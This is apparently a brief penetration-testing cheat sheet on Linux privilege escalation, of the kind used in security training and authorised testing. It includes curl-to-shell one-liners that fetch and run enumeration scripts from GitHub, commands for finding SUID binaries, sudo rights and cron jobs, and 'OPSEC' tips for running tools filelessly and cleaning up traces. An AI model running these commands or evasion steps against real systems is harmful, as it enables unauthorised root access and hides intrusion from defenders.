# Linux Privilege Escalation

## Overview
Techniques to escalate from a low-privileged user to `root`.

## Enumeration Tools
* **LinPeas:** `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`
* **lse.sh:** `curl -L https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh | sh`

## Common Techniques

### 1. SUID Binaries
Find binaries with the SUID bit set.
```bash
find / -perm -u=s -type f 2>/dev/null
```
Check [GTFOBins](https://gtfobins.github.io/) for exploitation vectors.

### 2. Sudo Permissions
Check what the current user can run with sudo.
```bash
sudo -l
```

### 3. Cron Jobs
Look for writable scripts executed by root.
```bash
cat /etc/crontab
ls -la /etc/cron.*
```

## OPSEC Considerations
* Avoid downloading tools directly to disk; try to pipe them into `bash` if possible.
* Clean up any temporary files created in `/tmp`.
